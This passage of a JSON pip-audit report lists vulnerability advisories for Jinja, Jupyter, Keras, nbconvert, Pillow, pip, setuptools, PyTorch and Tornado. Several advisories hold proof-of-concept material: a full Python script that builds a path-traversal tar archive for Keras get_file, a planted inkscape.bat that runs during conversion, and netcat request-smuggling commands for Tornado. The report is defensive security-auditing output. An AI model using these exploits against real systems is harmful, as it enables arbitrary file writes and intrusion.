      "message": "None None -> CVE-2025-27516 An oversight in how the Jinja sandboxed environment interacts with the `|attr` filter allows an attacker that controls the content of a template to execute arbitrary Python code.  To exploit the vulnerability, an attacker needs to control the content of a template. Whether that is the case depends on the type of application using Jinja. This vulnerability impacts users of applications which execute untrusted templates.  Jinja's sandbox does catch calls to `str.format` and ensures they don't escape the sandbox. However, it's possible to use the `|attr` filter to get a reference to a string's plain format method, bypassing the sandbox. After the fix, the `|attr` filter no longer bypasses the environment's attribute lookup.",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "3.1.6"
        ],
        "aliases": [
          "GHSA-cpwx-vrp4-4pq7"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> CVE-2025-30167 ## Impact  On Windows, the shared `%PROGRAMDATA%` directory is searched for configuration files (`SYSTEM_CONFIG_PATH` and `SYSTEM_JUPYTER_PATH`), which may allow users to create configuration files affecting other users.  Only shared Windows systems with multiple users and unprotected `%PROGRAMDATA%` are affected.  ## Mitigations  - upgrade to `jupyter_core>=5.8.1` (5.8.0 is patched but breaks `jupyter-server`) , or - as administrator, modify the permissions on the `%PROGRAMDATA%` directory so it is not writable by unauthorized users, or - as administrator, create the `%PROGRAMDATA%\\jupyter` directory with appropriately restrictive permissions, or - as user or administrator, set the `%PROGRAMDATA%` environment variable to a directory with appropriately restrictive permissions (e.g. controlled by administrators _or_ the current user)  ## Credit  Reported via Trend Micro Zero Day Initiative as ZDI-CAN-25932",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "5.8.1"
        ],
        "aliases": [
          "GHSA-33p9-3p43-82vq"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> CVE-2024-22415 ### Impact Installations of jupyter-lsp running in environments without configured file system access control (on the operating system level), and with jupyter-server instances exposed to non-trusted network are vulnerable to unauthorised access and modification of file system beyond the jupyter root directory.  ### Patches Version 2.2.2 has been patched.  ### Workarounds Users of jupyterlab who do not use jupyterlab-lsp can uninstall jupyter-lsp.  ### Credits We would like to credit Bary Levy, researcher of pillar.security research team, for the discovery and responsible disclosure of this vulnerability.  Edit: based on advice from pillar.security the Confidentiality/Integrity/Availability were increased to High to reflect potential for critical impact on publicly hosted jupyter-server instances lacking isolation of user privileges on operating system level (for best practices please consult https://jupyterhub.readthedocs.io/en/stable/explanation/websecurity.html#protect-users-from-each-other) and CWE-94 was added due to a potential vulnerability chaining in specific environments.",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "2.2.2"
        ],
        "aliases": [
          "GHSA-4qhp-652w-c22x"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> PYSEC-2023-272 The Jupyter Server provides the backend (i.e. the core services, APIs, and REST endpoints) for Jupyter web applications like Jupyter notebook, JupyterLab, and Voila. Unhandled errors in API requests coming from an authenticated user include traceback information, which can include path information. There is no known mechanism by which to trigger these errors without authentication, so the paths revealed are not considered particularly sensitive, given that the requesting user has arbitrary execution permissions already in the same environment. A fix has been introduced in commit `0056c3aa52` which no longer includes traceback information in JSON error responses. For compatibility, the traceback field is present, but always empty. This commit has been included in version 2.11.2. Users are advised to upgrade. There are no known workarounds for this vulnerability.",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "2.11.2"
        ],
        "aliases": [
          "CVE-2023-49080",
          "GHSA-h56g-gq9v-vc8r"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> PYSEC-2024-165 The Jupyter Server provides the backend for Jupyter web applications. Jupyter Server on Windows has a vulnerability that lets unauthenticated attackers leak the NTLMv2 password hash of the Windows user running the Jupyter server. An attacker can crack this password to gain access to the Windows machine hosting the Jupyter server, or access other network-accessible machines or 3rd party services using that credential. Or an attacker perform an NTLM relay attack without cracking the credential to gain access to other network-accessible machines. This vulnerability is fixed in 2.14.1.",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "2.14.1"
        ],
        "aliases": [
          "GHSA-hrw6-wg82-cm62",
          "CVE-2024-35178"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> CVE-2025-59842 Links generated with LaTeX typesetters in Markdown files and Markdown cells in JupyterLab and Jupyter Notebook did not include the `noopener` attribute.  This is deemed to have no impact on the default installations. Theoretically users of third-party LaTeX-rendering extensions could find themselves vulnerable to reverse tabnabbing attacks if: - links generated by those extensions included `target=_blank` (no such extensions are known at time of writing) and - they were to click on a link generated in LaTeX (typically visibly different from other links).  For consistency with handling on other links, new versions of JupyterLab will enforce `noopener` and `target=_blank` on all links generated by typesetters. The former will harden the resilience of JupyterLab to extensions with lack of secure defaults in link rendering, and the latter will improve user experience by preventing accidental state loss when clicking on links rendered by LaTeX typesetters.  ### Impact  Since the official LaTeX typesetter extensions for JupyterLab: `jupyterlab-mathjax` (default), `jupyterlab-mathjax2` and `jupyterlab-katex` do not include the `target=_blank`, there is no impact for JupyterLab users.  ### Patches  JupyterLab 4.4.8  ### Workarounds  No workarounds are necessary.  ### References  None",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "4.4.8"
        ],
        "aliases": [
          "GHSA-vvfj-2jqx-52jm"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> CVE-2024-55459 An issue in keras 3.7.0 allows attackers to write arbitrary files to the user's machine via downloading a crafted tar file through the get_file function.",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [],
        "aliases": [
          "GHSA-cjgq-5qmw-rcj6"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> CVE-2025-9906 ### Arbitrary Code Execution in Keras  Keras versions prior to 3.11.0 allow for arbitrary code execution when loading a crafted `.keras` model archive, even when `safe_mode=True`.  The issue arises because the archive’s `config.json` is parsed before layer deserialization. This can invoke `keras.config.enable_unsafe_deserialization()`, effectively disabling safe mode from within the loading process itself. An attacker can place this call first in the archive and then include a `Lambda` layer whose function is deserialized from a pickle, leading to the execution of attacker-controlled Python code as soon as a victim loads the model file.  Exploitation requires a user to open an untrusted model; no additional privileges are needed. The fix in version 3.11.0 enforces safe-mode semantics *before* reading any user-controlled configuration and prevents the toggling of unsafe deserialization via the config file.  **Affected versions:** < 3.11.0 **Patched version:** 3.11.0  It is recommended to upgrade to version 3.11.0 or later and to avoid opening untrusted model files.",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "3.11.0"
        ],
        "aliases": [
          "GHSA-36fq-jgmw-4r9c"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> CVE-2025-12058 The Keras.Model.load_model method, including when executed with the intended security mitigation safe_mode=True, is vulnerable to arbitrary local file loading and Server-Side Request Forgery (SSRF).   This vulnerability stems from the way the StringLookup layer is handled during model loading from a specially crafted .keras archive. The constructor for the StringLookup layer accepts a vocabulary argument that can specify a local file path or a remote file path.    *  Arbitrary Local File Read: An attacker can create a malicious .keras file that embeds a local path in the StringLookup layer's configuration. When the model is loaded, Keras will attempt to read the content of the specified local file and incorporate it into the model state (e.g., retrievable via get_vocabulary()), allowing an attacker to read arbitrary local files on the hosting system.     *  Server-Side Request Forgery (SSRF): Keras utilizes tf.io.gfile for file operations. Since tf.io.gfile supports remote filesystem handlers (such as GCS and HDFS) and HTTP/HTTPS protocols, the same mechanism can be leveraged to fetch content from arbitrary network endpoints on the server's behalf, resulting in an SSRF condition.   The security issue is that the feature allowing external path loading was not properly restricted by the safe_mode=True flag, which was intended to prevent such unintended data access.",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "3.12.0"
        ],
        "aliases": [
          "GHSA-mq84-hjqx-cwf2"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> CVE-2025-12060 ## Summary  Keras's `keras.utils.get_file()` function is vulnerable to directory traversal attacks despite implementing `filter_safe_paths()`. The vulnerability exists because `extract_archive()` uses Python's `tarfile.extractall()` method without the security-critical `filter=\"data\"` parameter. A PATH_MAX symlink resolution bug occurs before path filtering, allowing malicious tar archives to bypass security checks and write files outside the intended extraction directory.  ## Details  ### Root Cause Analysis  **Current Keras Implementation** ```python # From keras/src/utils/file_utils.py#L121 if zipfile.is_zipfile(file_path):     # Zip archive.     archive.extractall(path) else:     # Tar archive, perhaps unsafe. Filter paths.     archive.extractall(path, members=filter_safe_paths(archive)) ```  ### The Critical Flaw  While Keras attempts to filter unsafe paths using `filter_safe_paths()`, this filtering happens after the tar archive members are parsed and before actual extraction. However, the PATH_MAX symlink resolution bug occurs during extraction, not during member enumeration.  **Exploitation Flow:** 1. **Archive parsing**: `filter_safe_paths()` sees symlink paths that appear safe 2. **Extraction begins**: `extractall()` processes the filtered members 3. **PATH_MAX bug triggers**: Symlink resolution fails due to path length limits 4. **Security bypass**: Failed resolution causes literal path interpretation 5. **Directory traversal**: Files written outside intended directory  ### Technical Details  The vulnerability exploits a known issue in Python's `tarfile` module where excessively long symlink paths can cause resolution failures, leading to the symlink being treated as a literal path. This bypasses Keras's path filtering because:  - `filter_safe_paths()` operates on the parsed tar member information - The PATH_MAX bug occurs during actual file system operations in `extractall()` - Failed symlink resolution falls back to literal path interpretation - This allows traversal paths like `../../../../etc/passwd` to be written  ### Affected Code Location  **File**: `keras/src/utils/file_utils.py`   **Function**: `extract_archive()` around line 121   **Issue**: Missing `filter=\"data\"` parameter in `tarfile.extractall()`  ## Proof of Concept ``` #!/usr/bin/env python3 import os, io, sys, tarfile, pathlib, platform, threading, time import http.server, socketserver  # Import Keras directly (not through TensorFlow) try:     import keras     print(\"Using standalone Keras:\", keras.__version__)     get_file = keras.utils.get_file except ImportError:     try:         import tensorflow as tf         print(\"Using Keras via TensorFlow:\", tf.keras.__version__)         get_file = tf.keras.utils.get_file     except ImportError:         print(\"Neither Keras nor TensorFlow found!\")         sys.exit(1)  print(\"=\" * 60) print(\"Keras get_file() PATH_MAX Symlink Vulnerability PoC\") print(\"=\" * 60) print(\"Python:\", sys.version.split()[0]) print(\"Platform:\", platform.platform())  root = pathlib.Path.cwd() print(f\"Working directory: {root}\")  # Create target directory for exploit demonstration exploit_dir = root / \"exploit\" exploit_dir.mkdir(exist_ok=True)  # Clean up any previous exploit files try:     (exploit_dir / \"keras_pwned.txt\").unlink() except FileNotFoundError:     pass  print(f\"\\n=== INITIAL STATE ===\") print(f\"Exploit directory: {exploit_dir}\") print(f\"Files in exploit/: {[f.name for f in exploit_dir.iterdir()]}\")  # Create malicious tar with PATH_MAX symlink resolution bug print(f\"\\n=== Building PATH_MAX Symlink Exploit ===\")  # Parameters for PATH_MAX exploitation comp = 'd' * (55 if sys.platform == 'darwin' else 247) steps = \"abcdefghijklmnop\"  # 16-step symlink chain path = \"\"  with tarfile.open(\"keras_dataset.tgz\", mode=\"w:gz\") as tar:     print(\"Creating deep symlink chain...\")          # Build the symlink chain that will exceed PATH_MAX during resolution     for i, step in enumerate(steps):         # Directory with long name         dir_info = tarfile.TarInfo(os.path.join(path, comp))         dir_info.type = tarfile.DIRTYPE         tar.addfile(dir_info)                  # Symlink pointing to that directory         link_info = tarfile.TarInfo(os.path.join(path, step))         link_info.type = tarfile.SYMTYPE         link_info.linkname = comp         tar.addfile(link_info)                  path = os.path.join(path, comp)                  if i < 3 or i % 4 == 0:  # Print progress for first few and every 4th             print(f\"  Step {i+1}: {step} -> {comp[:20]}...\")          # Create the final symlink that exceeds PATH_MAX     # This is where the symlink resolution breaks down     long_name = \"x\" * 254     linkpath = os.path.join(\"/\".join(steps), long_name)          max_link = tarfile.TarInfo(linkpath)     max_link.type = tarfile.SYMTYPE     max_link.linkname = (\"../\" * len(steps))     tar.addfile(max_link)          print(f\"✓ Created PATH_MAX symlink: {len(linkpath)} characters\")     print(f\"  Points to: {'../' * len(steps)}\")          # Exploit file through the broken symlink resolution     exploit_path = linkpath + \"/../../../exploit/keras_pwned.txt\"     exploit_content = b\"KERAS VULNERABILITY CONFIRMED!\\nThis file was created outside the cache directory!\\nKeras get_file() is vulnerable to PATH_MAX symlink attacks!\\n\"          exploit_file = tarfile.TarInfo(exploit_path)     exploit_file.type = tarfile.REGTYPE     exploit_file.size = len(exploit_content)     tar.addfile(exploit_file, fileobj=io.BytesIO(exploit_content))          print(f\"✓ Added exploit file via broken symlink path\")          # Add legitimate dataset content     dataset_content = b\"# Keras Dataset Sample\\nThis appears to be a legitimate ML dataset\\nimage1.jpg,cat\\nimage2.jpg,dog\\nimage3.jpg,bird\\n\"     dataset_file = tarfile.TarInfo(\"dataset/labels.csv\")     dataset_file.type = tarfile.REGTYPE     dataset_file.size = len(dataset_content)     tar.addfile(dataset_file, fileobj=io.BytesIO(dataset_content))          # Dataset directory     dataset_dir = tarfile.TarInfo(\"dataset/\")     dataset_dir.type = tarfile.DIRTYPE     tar.addfile(dataset_dir)  print(\"✓ Malicious Keras dataset created\")  # Comparison Test: Python tarfile with filter (SAFE) print(f\"\\n=== COMPARISON: Python tarfile with data filter ===\") try:     with tarfile.open(\"keras_dataset.tgz\", \"r:gz\") as tar:         tar.extractall(\"python_safe\", filter=\"data\")          files_after = [f.name for f in exploit_dir.iterdir()]     print(f\"✓ Python safe extraction completed\")     print(f\"Files in exploit/: {files_after}\")          # Cleanup     import shutil     if pathlib.Path(\"python_safe\").exists():         shutil.rmtree(\"python_safe\", ignore_errors=True)          except Exception as e:     print(f\"❌ Python safe extraction blocked: {str(e)[:80]}...\")     files_after = [f.name for f in exploit_dir.iterdir()]     print(f\"Files in exploit/: {files_after}\")  # Start HTTP server to serve malicious archive class SilentServer(http.server.SimpleHTTPRequestHandler):     def log_message(self, *args): pass  def run_server():     with socketserver.TCPServer((\"127.0.0.1\", 8005), SilentServer) as httpd:         httpd.allow_reuse_address = True         httpd.serve_forever()  server = threading.Thread(target=run_server, daemon=True) server.start() time.sleep(0.3)  # Keras vulnerability test cache_dir = root / \"keras_cache\" cache_dir.mkdir(exist_ok=True) url = \"http://127.0.0.1:8005/keras_dataset.tgz\"  print(f\"\\n=== KERAS VULNERABILITY TEST ===\") print(f\"Testing: keras.utils.get_file() with extract=True\") print(f\"URL: {url}\") print(f\"Cache: {cache_dir}\") print(f\"Expected extraction: keras_cache/datasets/keras_dataset/\") print(f\"Exploit target: exploit/keras_pwned.txt\")  try:     # The vulnerable Keras call     extracted_path = get_file(         \"keras_dataset\",         url,         cache_dir=str(cache_dir),         extract=True     )     print(f\"✓ Keras extraction completed\")     print(f\"✓ Returned path: {extracted_path}\")      except Exception as e:     print(f\"❌ Keras extraction failed: {e}\")     import traceback     traceback.print_exc()  # Vulnerability assessment print(f\"\\n=== VULNERABILITY RESULTS ===\") final_exploit_files = [f.name for f in exploit_dir.iterdir()] print(f\"Files in exploit directory: {final_exploit_files}\")  if \"keras_pwned.txt\" in final_exploit_files:     print(f\"\\n🚨 KERAS VULNERABILITY CONFIRMED! 🚨\")          exploit_file = exploit_dir / \"keras_pwned.txt\"     content = exploit_file.read_text()     print(f\"Exploit file created: {exploit_file}\")     print(f\"Content:\\n{content}\")          print(f\"🔍 TECHNICAL DETAILS:\")     print(f\"   • Keras uses tarfile.extractall() without filter parameter\")     print(f\"   • PATH_MAX symlink resolution bug bypassed security checks\")     print(f\"   • File created outside intended cache directory\")     print(f\"   • Same vulnerability pattern as TensorFlow get_file()\")          print(f\"\\n📊 COMPARISON RESULTS:\")     print(f\"   ✅ Python with filter='data': BLOCKED exploit\")     print(f\"   ⚠️  Keras get_file(): ALLOWED exploit\")      else:     print(f\"✅ No exploit files detected\")     print(f\"Possible reasons:\")     print(f\"   • Keras version includes security patches\")     print(f\"   • Platform-specific path handling prevented exploit\")     print(f\"   • Archive extraction path differed from expected\")  # Show what Keras actually extracted (safely) print(f\"\\n=== KERAS EXTRACTION ANALYSIS ===\") try:     if 'extracted_path' in locals() and pathlib.Path(extracted_path).exists():         keras_path = pathlib.Path(extracted_path)         print(f\"Keras extracted to: {keras_path}\")                  # Safely list contents         try:             contents = [item.name for item in keras_path.iterdir()]             print(f\"Top-level contents: {contents}\")                          # Count symlinks (indicates our exploit structure was created)             symlink_count = 0             for item in keras_path.iterdir():                 try:                     if item.is_symlink():                         symlink_count += 1                 except PermissionError:                     continue                          print(f\"Symlinks created: {symlink_count}\")             if symlink_count > 0:                 print(f\"✓ PATH_MAX symlink chain was extracted\")                          except PermissionError:             print(f\"Permission errors in extraction directory (expected with symlink corruption)\")              except Exception as e:     print(f\"Could not analyze Keras extraction: {e}\")  print(f\"\\n=== REMEDIATION ===\") print(f\"To fix this vulnerability, Keras should use:\") print(f\"```python\") print(f\"tarfile.extractall(path, filter='data')  # Safe\") print(f\"```\") print(f\"Instead of:\") print(f\"```python\")  print(f\"tarfile.extractall(path)  # Vulnerable\") print(f\"```\")  # Cleanup print(f\"\\n=== CLEANUP ===\") try:     os.unlink(\"keras_dataset.tgz\")     print(f\"✓ Removed malicious tar file\") except:     pass  print(\"PoC completed!\")  ``` ### Environment Setup - **Python**: 3.8+ (tested on multiple versions) - **Keras**: Standalone Keras or TensorFlow.Keras - **Platform**: Linux, macOS, Windows (path handling varies)  ### Exploitation Steps  1. **Create malicious tar archive** with PATH_MAX symlink chain 2. **Host archive** on accessible HTTP server 3. **Call `keras.utils.get_file()`** with `extract=True` 4. **Observe directory traversal** - files written outside cache directory  ### Key Exploit Components  - **Deep symlink chain**: 16+ nested symlinks with long directory names - **PATH_MAX overflow**: Final symlink path exceeding system limits - **Traversal payload**: Relative path traversal (`../../../target/file`) - **Legitimate disguise**: Archive contains valid-looking dataset files  ### Demonstration Results  **Vulnerable behavior:** - Files extracted outside intended `cache_dir/datasets/` location - Security filtering bypassed completely - No error or warning messages generated  **Expected secure behavior:** - Extraction blocked or confined to cache directory - Security warnings for suspicious archive contents  ## Impact  ### Vulnerability Classification - **Type**: Directory Traversal / Path Traversal (CWE-22) - **Severity**: High - **CVSS Components**: Network accessible, no authentication required, impacts confidentiality and integrity  ### Who Is Impacted  **Direct Impact:** - Applications using `keras.utils.get_file()` with `extract=True` - Machine learning pipelines downloading and extracting datasets - Automated ML training systems processing external archives  **Attack Scenarios:** 1. **Malicious datasets**: Attacker hosts compromised ML dataset 2. **Supply chain**: Legitimate dataset repositories compromised 3. **Model poisoning**: Extraction writes malicious files alongside training data 4. **System compromise**: Configuration files, executables written to system directories  **Affected Environments:** - Research environments downloading public datasets - Production ML systems with automated dataset fetching - Educational platforms using Keras for tutorials - CI/CD pipelines training models with external data  ### Risk Assessment  **High Risk Factors:** - Common usage pattern in ML workflows - No user awareness of extraction security - Silent failure mode (no warnings) - Cross-platform vulnerability  **Potential Consequences:** - Arbitrary file write on target system - Configuration file tampering - Code injection via overwritten scripts - Data exfiltration through planted files - System compromise in containerized environments  ## Recommended Fix  ### Immediate Mitigation  Replace the vulnerable extraction code with:  ```python # Secure implementation if zipfile.is_zipfile(file_path):     # Zip archive - implement similar filtering     archive.extractall(path, members=filter_safe_paths(archive)) else:     # Tar archive with proper security filter     archive.extractall(path, members=filter_safe_paths(archive), filter=\"data\") ```  ### Long-term Solution  1. **Add `filter=\"data\"` parameter** to all `tarfile.extractall()` calls 2. **Implement comprehensive path validation** before extraction 3. **Add extraction logging** for security monitoring 4. **Consider sandboxed extraction** for untrusted archives 5. **Update documentation** to warn about archive security risks  ### Backward Compatibility  The fix maintains full backward compatibility as `filter=\"data\"` is the recommended secure default for Python 3.12+.  ## References  - [[Python tarfile security documentation](https://docs.python.org/3/library/tarfile.html#extraction-filters)](https://docs.python.org/3/library/tarfile.html#extraction-filters) - [[CVE-2007-4559](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-4559)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-4559) - Related tarfile vulnerability - [[OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)](https://owasp.org/www-community/attacks/Path_Traversal)  Note: Reported in Huntr as well, but didn't get response https://huntr.com/bounties/f94f5beb-54d8-4e6a-8bac-86d9aee103f4",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "3.12.0"
        ],
        "aliases": [
          "GHSA-hjqc-jx6g-rwp9"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> CVE-2025-53000 ### Summary  On Windows, converting a notebook containing SVG output to a PDF results in unauthorized code execution. Specifically, a third party can create a `inkscape.bat` file that defines a [Windows batch script](https://en.wikipedia.org/wiki/Batch_file), capable of arbitrary code execution.  When a user runs `jupyter nbconvert --to pdf` on a notebook containing SVG output to a PDF on a Windows platform from this directory, the `inkscape.bat` file is run unexpectedly.  ### Details _Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer._  `nbconvert` searches for an `inkscape` executable when converting notebooks to PDFs here: https://github.com/jupyter/nbconvert/blob/4f61702f5c7524d8a3c4ac0d5fc33a6ac2fa36a7/nbconvert/preprocessors/svg2pdf.py#L104  The MITRE page on [CWE-427 (Uncontrolled Search Path Element)](https://cwe.mitre.org/data/definitions/427.html) summarizes the root cause succinctly:  > In Windows-based systems, when the `LoadLibrary` or `LoadLibraryEx` function is called with a DLL name that does not contain a fully qualified path, the function follows a search order that includes two path elements that might be uncontrolled: > - the directory from which the program has been loaded > - the current working directory  ### PoC  _Complete instructions, including specific configuration details, to reproduce the vulnerability._  1. Create a directory containing:       - A hidden bat file called `inkscape.bat` containing `msg * \"You've been hacked!\"`      - A dummy ipynb file called `Machine_Learning.ipynb`  2. Run the command `jupyter nbconvert --to pdf Machine_Learning.ipynb`.  3. Wait a few seconds, and you should see a popup showing the message \"You've been hacked!\"   ### Impact  All Windows users.",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [],
        "aliases": [
          "GHSA-xm59-rqc7-hhvf"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> CVE-2024-28219 In _imagingcms.c in Pillow before 10.3.0, a buffer overflow exists because strcpy is used instead of strncpy.",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "10.3.0"
        ],
        "aliases": [
          "GHSA-44wm-f244-xhp3"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> CVE-2025-8869 When extracting a tar archive pip may not check symbolic links point into the extraction directory if the tarfile module doesn't implement PEP 706. Note that upgrading pip to a \"fixed\" version for this vulnerability doesn't fix all known vulnerabilities that are remediated by using a Python version that implements PEP 706. Note that this is a vulnerability in pip's fallback implementation of tar extraction for Python versions that don't implement PEP 706 and therefore are not secure to all vulnerabilities in the Python 'tarfile' module. If you're using a Python version that implements PEP 706 then pip doesn't use the \"vulnerable\" fallback code. Mitigations include upgrading to a version of pip that includes the fix, upgrading to a Python version that implements PEP 706 (Python >=3.9.17, >=3.10.12, >=3.11.4, or >=3.12), applying the linked patch, or inspecting source distributions (sdists) before installation as is already a best-practice.",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "25.3"
        ],
        "aliases": [
          "GHSA-4xh5-x5gv-qwph"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> PYSEC-2025-49 setuptools is a package that allows users to download, build, install, upgrade, and uninstall Python packages. A path traversal vulnerability in `PackageIndex` is present in setuptools prior to version 78.1.1. An attacker would be allowed to write files to arbitrary locations on the filesystem with the permissions of the process running the Python code, which could escalate to remote code execution depending on the context. Version 78.1.1 fixes the issue.",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "78.1.1"
        ],
        "aliases": [
          "CVE-2025-47273",
          "GHSA-5rjg-fvgr-3xxf"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> CVE-2024-6345 A vulnerability in the `package_index` module of pypa/setuptools versions up to 69.1.1 allows for remote code execution via its download functions. These functions, which are used to download packages from URLs provided by users or retrieved from package index servers, are susceptible to code injection. If these functions are exposed to user-controlled inputs, such as package URLs, they can execute arbitrary commands on the system. The issue is fixed in version 70.0.",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "70.0.0"
        ],
        "aliases": [
          "GHSA-cx63-2mw6-8hw5"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> PYSEC-2025-41 PyTorch is a Python package that provides tensor computation with strong GPU acceleration and deep neural networks built on a tape-based autograd system. In version 2.5.1 and prior, a Remote Command Execution (RCE) vulnerability exists in PyTorch when loading a model using torch.load with weights_only=True. This issue has been patched in version 2.6.0.",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "2.6.0"
        ],
        "aliases": [
          "GHSA-53q9-r3pm-6pq6",
          "CVE-2025-32434"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> CVE-2025-2953 A vulnerability, which was classified as problematic, has been found in PyTorch 2.6.0+cu124. Affected by this issue is the function torch.mkldnn_max_pool2d. The manipulation leads to denial of service. An attack has to be approached locally. The exploit has been disclosed to the public and may be used.",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "2.7.1rc1"
        ],
        "aliases": [
          "GHSA-3749-ghw9-m3mg"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> CVE-2025-3730 A vulnerability, which was classified as problematic, was found in PyTorch 2.6.0. Affected is the function torch.nn.functional.ctc_loss of the file aten/src/ATen/native/LossCTC.cpp. The manipulation leads to denial of service. An attack has to be approached locally. The exploit has been disclosed to the public and may be used. The name of the patch is 46fc5d8e360127361211cb237d5f9eef0223e567. It is recommended to apply a patch to fix this issue.",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "2.8.0"
        ],
        "aliases": [
          "GHSA-887c-mr87-cxwp"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> GHSA-753j-mpmx-qq6g ### Summary When Tornado receives a request with two `Transfer-Encoding: chunked` headers, it ignores them both. This enables request smuggling when Tornado is deployed behind a proxy server that emits such requests. [Pound](https://en.wikipedia.org/wiki/Pound_(networking)) does this.  ### PoC 0. Install Tornado. 1. Start a simple Tornado server that echoes each received request's body: ```bash cat << EOF > server.py import asyncio import tornado  class MainHandler(tornado.web.RequestHandler):     def post(self):         self.write(self.request.body)  async def main():     tornado.web.Application([(r\"/\", MainHandler)]).listen(8000)     await asyncio.Event().wait()  asyncio.run(main()) EOF python3 server.py & ``` 2. Send a valid chunked request: ```bash printf 'POST / HTTP/1.1\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n1\\r\\nZ\\r\\n0\\r\\n\\r\\n' | nc localhost 8000 ``` 3. Observe that the response is as expected: ``` HTTP/1.1 200 OK Server: TornadoServer/6.3.3 Content-Type: text/html; charset=UTF-8 Date: Sat, 07 Oct 2023 17:32:05 GMT Content-Length: 1  Z ``` 4. Send a request with two `Transfer-Encoding: chunked` headers: ``` printf 'POST / HTTP/1.1\\r\\nTransfer-Encoding: chunked\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n1\\r\\nZ\\r\\n0\\r\\n\\r\\n' | nc localhost 8000 ``` 5. Observe the strange response: ``` HTTP/1.1 200 OK Server: TornadoServer/6.3.3 Content-Type: text/html; charset=UTF-8 Date: Sat, 07 Oct 2023 17:35:40 GMT Content-Length: 0  HTTP/1.1 400 Bad Request  ``` This is because Tornado believes that the request has no message body, so it tries to interpret `1\\r\\nZ\\r\\n0\\r\\n\\r\\n` as its own request, which causes a 400 response. With a little cleverness involving `chunk-ext`s, you can get Tornado to instead respond 405, which has the potential to desynchronize the connection, as opposed to 400 which should always result in a connection closure.  ### Impact Anyone using Tornado behind a proxy that forwards requests containing multiple `Transfer-Encoding: chunked` headers is vulnerable to request smuggling, which may entail ACL bypass, cache poisoning, or connection desynchronization.",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "6.4.1"
        ],
        "aliases": []
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> GHSA-w235-7p84-xx57 ### Summary Tornado’s `curl_httpclient.CurlAsyncHTTPClient` class is vulnerable to CRLF (carriage return/line feed) injection in the request headers.  ### Details When an HTTP request is sent using `CurlAsyncHTTPClient`, Tornado does not reject carriage return (\\r) or line feed (\\n) characters in the request headers. As a result, if an application includes an attacker-controlled header value in a request sent using `CurlAsyncHTTPClient`, the attacker can inject arbitrary headers into the request or cause the application to send arbitrary requests to the specified server.  This behavior differs from that of the standard `AsyncHTTPClient` class, which does reject CRLF characters.  This issue appears to stem from libcurl's (as well as pycurl's) lack of validation for the [`HTTPHEADER`](https://curl.se/libcurl/c/CURLOPT_HTTPHEADER.html) option. libcurl’s documentation states:  > The headers included in the linked list must not be CRLF-terminated, because libcurl adds CRLF after each header item itself. Failure to comply with this might result in strange behavior. libcurl passes on the verbatim strings you give it, without any filter or other safe guards. That includes white space and control characters.  pycurl similarly appears to assume that the headers adhere to the correct format. Therefore, without any validation on Tornado’s part, header names and values are included verbatim in the request sent by `CurlAsyncHTTPClient`, including any control characters that have special meaning in HTTP semantics.  ### PoC The issue can 